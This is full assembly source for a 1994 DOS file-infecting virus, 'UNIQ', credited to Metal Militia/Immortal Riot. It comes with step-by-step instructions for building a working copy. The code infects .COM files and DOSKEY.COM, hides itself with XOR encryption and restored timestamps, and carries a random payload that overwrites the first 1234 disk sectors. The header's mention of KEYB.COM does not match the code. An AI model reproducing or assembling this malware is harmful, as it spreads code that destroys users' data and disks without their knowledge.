; Virusname : UNIQ
; Origin    : Sweden
; Author    : Metal Militia/Immortal Riot
;
; Before you is a "fixed-up" version of the IR.144 virus. The
; differences are very big, though. To take some examples, thisone
; has direct infection of the KEYB.COM file in your \DOS directory,
; it's XOR encrypted, restore the files date/time stamp, set's the
; file attrib's to zero and has a probability of 2% that it overwrites
; the first 1234 sectors on your C: drive when executed. Since it more
; or less 'stays' in your computer after that direct infection, the
; regular user won't notice anything before the trashing routine does
; it's dirty work :) Thanks to The Unforgiven for "bug-fixing" a few
; things when i was totally fucked up by tiredness.
;
; In order to get a working copy of this virus you'll need to do the
; following: first assemble the dummy code below here plus the virus
; aswell. Then do a simple "copy /b dummy.com+uniq.com working.com".
; Now you'll have a ready one.
;
; -----------------------
;
; .model tiny ; DUMMY.ASM
; .code
; org 100h
;
; sov:
;
; xchg ax,ax ; nop
; xchg ax,ax ; nop
; xchg ax,ax ; nop
; xchg ax,ax ; nop
;
; end sov
;
; -----------------------
;

.model tiny ; UNIQ.ASM
.radix 16
.code
        org 100h
start:
call get_offset
get_offset:
pop     bp                   ; now we're here, so get it
sub     bp,offset get_offset ; and offset the 'procedure'

        call  enc_dec        ; decrypt us
        jmp   real_start

enc_val dw    0              ; "buffer" for our encryption value

write_da_code:
        call    enc_dec
        mov     ah,40                             ; write the
        mov     cx,end_virus-start                ; viral code
        lea     dx,[bp+start]                     ; to victim's
        int     21                                ; awesome phile
        call    enc_dec
        ret

enc_dec:
        mov      bx,word ptr [bp+enc_val]         ; use our encryption
        lea      si,[bp+real_start]               ; value
        mov      cx,(end_virus-real_start+1)/2
rock_on:
        xor      word ptr [si],bx     ; the XOR loop goes here
        inc      si
        inc      si
        loop     rock_on
        ret

real_start:
        lea     si,[buffa_bytes+bp]   ; restore
        mov     di,100                ; the first
        movsw                         ; four bytes
        movsw                         ; from our buffer

        lea     dx,[end_virus+bp]     ; set the DTA
        mov     ah,1a                 ; to end of our virus
        int     21

        lea     dx,[doskeycom+bp]     ; offset c:\dos\doskey.com
        call    affeqtiz              ; in order to infect aswell

        mov     ah,4e                 ; now, back to our "current" dir
        lea     dx,[find_files+bp]    ; locate first file "*.com"
find_next:
        int     21
        jc      reset_DTA             ; was there an *ERROR* ?
        call    infect                ; If not, continue w/infection

        mov     ah,4f                 ; and get next
        jmp     short find_next       ; to affect aswell

reset_DTA:
        mov     ah,2c                 ; get time
        int     21

        cmp     dl,2                  ; 2% chance
        ja      real_DTA_reset        ; no? outa here

        mov     al,2                  ; sheesh!
        mov     cx,4d2h               ; i guess
        cwd                           ; the dude
        int     26h                   ; will be
        popf                          ; gone after
                                      ; thisone :)
real_DTA_reset:
        mov     dx,80                 ; reset the DTA
        mov     ah,1a
        int     21

        mov     di,100                ; and 'JMP' back
        push    di                    ; to the original
        ret                           ; program :)

infect:
        lea     dx,[end_virus+1e+bp]  ; 1e in DTA = filename
affeqtiz:
        mov     ax,4301               ; remove da fileattrib's
        xor     cx,cx                 ; (or.. rather set to zero)
        int     21

        mov     ax,3d02               ; so.. open it!
        int     21
        jc      ret_me

        xchg    bx,ax                 ; mov bx,ax

        mov     ax,5700               ; save date/time
        int     21

        push    cx
        push    dx

        mov     ah,3f                 ; read in
        mov     cx,4                  ; first four bytes
        lea     dx,[buffa_bytes+bp]   ; and save them
        int     21                    ; in our buffer

        cmp     byte ptr [buffa_bytes+bp+3],'V'   ; fourth byte's a 'V'?
        jz      close_em                          ; if so, outa here!

        mov     ax,4202                           ; goto EOF
        sub     cx,cx
        cwd
        int     21

        sub     ax,3                              ;
        mov     word ptr [bp+jump_bytes+1],ax     ; offset our 'JMP'!

random:
        mov     ah,2ch                            ; get a random
        int     21h                               ; value to use
        add     dl, dh                            ; with the
        jz      random                            ; encryption
        mov     word ptr [bp+enc_val],bx
        call    write_da_code                     ; write our viral code

        mov     ax,4200                           ; goto SOF
        sub     cx,cx
        cwd
        int     21

        mov     ah,40                             ; write our
        mov     cx,4                              ; own first four
        lea     dx,[bp+jump_bytes]                ; bytes over the
        int     21                                ; original

close_em:
        pop     dx
        pop     cx

        mov     ax,5701                           ; restore date/time
        int     21

        mov     ah,3e                             ; now close the fucker
        int     21
ret_me:
        ret                                       ; and ret to get next

V_name          db      '[UNiQ]'                  ; virus name
V_author        db      '(c) 1994 Metal Militia'  ; virus author
V_group_origin  db      'Immortal Riot, Sweden'   ; author group, origin
doskeycom       db      'c:\dos\doskey.com',0     ; direct infection
find_files      db      '*.com',0                 ; files to infect
jump_bytes      db      0e9,0,0,'V'               ; our marked "JMP"

buffa_bytes:                                      ; org. first 4 buffa
        xchg ax,ax ; one byte (nop)
        xchg ax,ax ; one byte (nop)
        int     20 ; two bytes

end_virus:
end start